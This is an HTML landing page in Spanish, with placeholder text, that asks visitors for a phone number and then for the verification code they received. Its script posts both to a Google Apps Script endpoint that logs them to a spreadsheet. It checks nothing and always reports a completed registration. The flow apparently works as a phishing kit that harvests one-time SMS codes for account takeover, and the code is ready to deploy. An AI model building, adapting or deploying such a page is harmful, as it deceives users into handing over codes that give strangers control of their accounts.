<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Landing Page Móvil</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background-color: #f4f4f4;
            text-align: center;
        }
        img { max-width: 100%; height: auto; margin-bottom: 20px; }
        p { font-size: 16px; margin-bottom: 20px; padding: 0 20px; }
        form { display: flex; flex-direction: column; align-items: center; width: 90%; max-width: 300px; }
        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 5px; font-size: 16px; box-sizing: border-box; }
        button { padding: 10px 20px; background-color: #007bff; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; width: 100%; }
        button:hover { background-color: #0056b3; }
        .modal { display: none; position: fixed; z-index: 1; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.4); justify-content: center; align-items: center; }
        .modal-content { background-color: #fefefe; padding: 20px; border: 1px solid #888; width: 80%; max-width: 300px; text-align: center; border-radius: 10px; }
    </style>
</head>
<body>

    <img src="https://i.postimg.cc/cHZR86WZ/468784.png" alt="Imagen">
    <p>Texto corto de ejemplo. ¡Regístrate ahora!</p>
    
    <form id="phoneForm">
        <input type="tel" id="phone" placeholder="Ingresa tu número de teléfono" required>
        <button type="button" onclick="submitPhone()">Enviar</button>
    </form>

    <div id="modal1" class="modal">
        <div class="modal-content">
            <p>Inserta el código recibido.</p>
            <form id="codeForm">
                <input type="text" id="code" placeholder="Código" required>
                <button type="button" onclick="submitCode()">Enviar Código</button>
            </form>
        </div>
    </div>

    <div id="modal2" class="modal">
        <div class="modal-content">
            <p>¡Gracias! Registro completado.</p>
            <button type="button" onclick="closeModal2()">Cerrar</button>
        </div>
    </div>

    <script>
        // Reemplaza con tu URL real de Google Apps Script
        const scriptURL = 'https://script.google.com/macros/s/AKfycbwCKfGdpsfQI8hz7DOkUBRdNCdcGHCy-f6TGT8gLLlVZrDeUiQI_ij0NxwSP5s81zcT/exec';

        function submitPhone() {
            const phone = document.getElementById('phone').value;
            if (!phone) return alert('Ingresa un número');

            fetch(scriptURL, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams({ 'phone': phone })
            }).then(() => {
                document.getElementById('modal1').style.display = 'flex';
            }).catch(error => console.error('Error:', error));
        }

        function submitCode() {
            const code = document.getElementById('code').value;
            if (!code) return alert('Ingresa el código');

            // NUEVO: Envío del código a la misma Google Sheet
            fetch(scriptURL, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: new URLSearchParams({ 'code': code })
            }).then(() => {
                document.getElementById('modal1').style.display = 'none';
                document.getElementById('modal2').style.display = 'flex';
            }).catch(error => console.error('Error:', error));
        }

        function closeModal2() {
            document.getElementById('modal2').style.display = 'none';
        }
    </script>
</body>
</html>
